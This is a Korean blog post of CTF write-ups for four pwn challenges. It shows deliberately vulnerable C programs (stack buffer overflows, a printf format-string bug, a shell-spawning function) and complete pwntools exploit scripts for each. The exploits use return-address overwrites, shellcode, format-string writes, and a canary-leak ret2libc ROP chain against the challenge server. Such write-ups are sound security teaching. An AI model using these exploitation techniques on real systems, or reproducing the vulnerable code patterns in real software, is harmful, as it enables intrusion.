---
layout: post
title: "제2회 융합보안공학과 CTF 문제 write-up"
author: "hazziin"
tags: [I.Sly()]
---

2023년 말에 출제했던 문제 풀이 백업!

---

# Pwn

## [Pwn] babybof
Can you BOF it?

<img src="{{ '/assets/isly_writeup/img04.png' | relative_url }}" width="400" class="img-left">

```c
//gcc -o babybof babybof.c -m32 -fno-stack-protector -no-pie -mpreferred-stack-boundary=2
//if you can't execute, plz run 'sudo apt-get install gcc-multilib'
 
#include <stdio.h>
#include <stdlib.h>
 
 
void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
}
 
void get_shell() {
    system("/bin/sh");
}
 
int main(){
 
    init();
 
    char buf[0x40];
 
    printf("BOF me!\n");
    scanf("%s", buf);
    printf("%s", buf);
 
    return 0;
}
```
매우 쉬운 스택 버퍼 오버플로 문제다. '새내기 친구들도 포너블 하나는 풀어야 하지 않을까?' 라는 심정으로 만든 문제...
canary가 걸려 있지 않고, 쉘을 주는 함수가 포함되어 있으니 해당 주소로 return address를 조작하면 된다. 단, 해당 문제는 32bit 환경이기 때문에 주소를 4byte로 계산해서 넣어 주어야 한다.

```py
from pwn import *
 
p = remote("ctf.h4ck1ngis1y.xyz", 24011)
 
payload = b"A"*0x48
payload += p32(0x8049274)
 
p.sendline(payload)
p.interactive()
```

## [Pwn] childbof
attack me!

<img src="{{ '/assets/isly_writeup/img05.png' | relative_url }}" width="400" class="img-left">

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[256]; // [rsp+0h] [rbp-100h] BYREF
 
  init(argc, argv, envp);
  printf("buf address: %p\n", v4);
  vuln(v4);
  printf("%s", v4);
  return 0;
}
 
char *__fastcall vuln(char *a1)
{
  char buf[512]; // [rsp+10h] [rbp-200h] BYREF
 
  printf("buf address: %p\n", buf);
  read(0, buf, 0x200uLL);
  return strcpy(a1, buf);
}
```
babybof의 연장선 문제...
모든 보호 기법이 꺼져 있으며, `main()`의 return에서 bof가 발생한다. 따라서 주소 크기를 계산해 버퍼에 셸코드를 넣고, 그곳으로 return하도록 해 주면 된다.
사실 `vuln()`이 아닌 `main()`의 return에서 return address overwrite가 가능하도록 한 번 꼬아서 낸 문제라서, `main()`과 `vuln()`의 버퍼 주소를 둘 다 출력하도록 했다.
아래는 orw 셸코드를 이용한 풀이다.

```py
from pwn import *
 
p = remote("ctf.h4ck1ngis1y.xyz", 24012)
context(arch='amd64', os='linux')
 
sc = ''
sc += shellcraft.pushstr('./flag')
sc += shellcraft.open('rsp', 0, 0)
sc += shellcraft.read('rax','rsp',100)
sc += shellcraft.write(1,'rsp',100)
 
sc = asm(sc)
 
payload = b"\x90"*0x40
payload += sc
 
while len(payload) != 0x108:
    payload += b"\x90"
 
payload += p64(0x7fffffffeaa0)
 
p.send(payload)
p.interactive()
```

## [Pwn] feel so bad
Plz make me feel good

<img src="{{ '/assets/isly_writeup/img07.png' | relative_url }}" width="400" class="img-left">

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[128]; // [esp+0h] [ebp-8Ch] BYREF
  unsigned int v5; // [esp+80h] [ebp-Ch]
  int *p_argc; // [esp+84h] [ebp-8h]
 
  p_argc = &argc;
  v5 = __readgsdword(0x14u);
  init();
  printf("target: %p\n", &n);
  printf("Input: ");
  read(0, buf, 0x80u);
  printf(buf);
  if ( n == -889275714 )
    good();
  else
    bad();
  return 0;
}
```
32bit FSB 문제다.
`printf()`에서 포맷스트링 버그가 존재하며, 이를 통해 `target`의 주소를 `0xcafebabe`로 바꿔 `good()`을 실행시켜야 한다.

<img src="{{ '/assets/isly_writeup/img06.png' | relative_url }}" width="700" class="img-left">

메모리를 출력해 보면, 7만큼 떨어진 곳에서 참조하는 것을 알 수 있다. 따라서 익스플로잇 코드는 아래와 같이 작성할 수 있다.

```py
from pwn import *
 
p = remote("ctf.h4ck1ngis1y.xyz", 24018)
 
p.recvuntil("target: ")
addr = int(p.recvn(10), 16)
 
payload = b''
payload += p32(addr)
payload += p32(addr+2)
payload += b"%47798c%7$hn"
payload += b"%4160c%8$hn"
 
p.send(payload)
p.interactive()
```

## [Pwn] PARROT
우리 앵무 천재예요

<img src="{{ '/assets/isly_writeup/img08.png' | relative_url }}" width="400" class="img-left">

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-94h] BYREF
  char buf[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v6; // [rsp+98h] [rbp-8h]
 
  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts(&s);
  puts(&byte_402038);
  puts(&byte_402068);
  puts(&byte_402090);
  puts(&byte_4020B8);
  puts(&byte_4020D8);
  puts("1. Parrot will imitate you!");
  puts("2. Say GOOD BYE to parrot");
  while ( 1 )
  {
    printf(">> ");
    __isoc99_scanf("%d", &v4);
    if ( v4 != 1 )
      break;
    fflush(_bss_start);
    read(0, buf, 0x200uLL);
    printf("%s", buf);
    v4 = 0;
  }
  if ( v4 == 2 )
  {
    printf("OK, so say BYE to parrot: ");
    fflush(_bss_start);
    read(0, buf, 0x200uLL);
    printf("%s", buf);
  }
  else
  {
    puts("Invalid Input");
  }
  return 0;
}
```
`buf`의 크기보다 `read()`로 받는 입력의 크기가 크기 때문에 bof가 발생한다. 이를 이용해 canary를 leak하고, ROP 페이로드를 전송해 공격하면 된다.

<img src="{{ '/assets/isly_writeup/img09.png' | relative_url }}" width="600" class="img-left">

해당 바이너리는 사용자의 input을 그대로 출력하니, `buf`를 가득 채워 canary를 leak할 수 있다.

익스플로잇 코드는 아래와 같이 작성할 수 있다.
canary leak 후 `puts()`로 `read()`의 got를 출력해 libc base를 leak한 뒤, 다시 `main()`을 호출했다. 이후 leak한 base 주소로 `system()`과 `/bin/sh` 문자열의 주소를 구해 ROP 페이로드를 전송하면 셸을 획득할 수 있다.

```py
from pwn import *
 
p = remote("ctf.h4ck1ngis1y.xyz", 24019)
e = ELF("./parrot")
libc = ELF("./libc.so.6")
 
read_got = e.got["read"]
puts_plt = e.plt["puts"]
 
puts_offset = libc.symbols["puts"]
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
 
prdi = 0x401263
main_addr = 0x40126c
ret = 0x40101a
 
p.recv()
 
p.sendline("1")
payload = b"A"*0x89
p.send(payload)
 
canary = b"\x00" + p.recv()[-7:]
 
p.sendline("2")
payload = b"A"*0x88
payload += canary
payload += b"B"*0x08
payload += p64(prdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main_addr)
p.send(payload)
 
p.recvuntil("A"*0x88)
read_addr = u64(p.recvuntil("\n")[:-1] + b"\x00\x00")
lb = read_addr - read_offset
system_addr = lb + system_offset
shell_addr = lb + 0x1b45bd
 
p.sendline("2")
payload = b"B"*0x88
payload += canary
payload += b"C"*0x08
payload += p64(ret)
payload += p64(prdi)
payload += p64(shell_addr)
payload += p64(system_addr)
 
p.send(payload)
 
p.interactive()
```
---
<br>

<br>